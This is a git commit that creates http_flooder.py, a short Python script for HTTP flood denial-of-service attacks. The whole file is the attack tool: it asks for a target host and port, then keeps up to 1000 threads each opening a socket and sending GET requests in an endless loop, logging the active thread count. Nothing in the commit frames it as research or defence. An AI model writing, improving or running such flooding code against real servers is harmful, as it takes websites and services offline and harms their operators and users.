6646f45a5ad1ee8d64a5eeeb15459353621d626d
jesoos-cries <85789605+jesoos-cries@users.noreply.github.com>
2021-06-13 13:01:31 +0800

    Create http_flooder.py

---
+++ http_flooder.py
@@ -0,0 +1,53 @@
+import threading
+import logging
+import socket
+import time
+import sys
+
+try:
+	host = input("HOST: ")
+	while True:
+		try:
+			port = int(input("PORT: "))
+			break
+		except ValueError:
+			print("Invalid port value.")
+			pass
+except KeyboardInterrupt:
+	sys.exit()
+active_threads = 0
+max_threads = 1000
+logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S", level=logging.INFO)
+
+def HTTP(host, port):
+	try:
+		global active_threads
+		active_threads += 1
+		http = f"GET / HTTP/1.1\r\nHost:{host}\r\n\r\n"
+		sock = socket.socket()
+		sock.connect((host, port))
+		while True:
+			sock.send(http.encode())
+	except Exception as e:
+		logging.info(f"HTTP Error: {e}")
+		pass
+	finally:
+		active_threads -= 1
+
+def verbose():
+	while True:
+		time.sleep(3)
+		logging.info(f"Active Threads: {active_threads}")
+
+logging.info(f"Initializing HTTP Flood with {max_threads} threads...")
+threading.Thread(target=verbose, daemon=True).start()
+while True:
+	try:
+		if active_threads >= max_threads:
+			continue
+		threading.Thread(target=HTTP, args=[host, port], daemon=True).start()
+	except Exception as e:
+		logging.info(f"Main Error: {e}")
+		pass
+	except KeyboardInterrupt:
+		sys.exit()
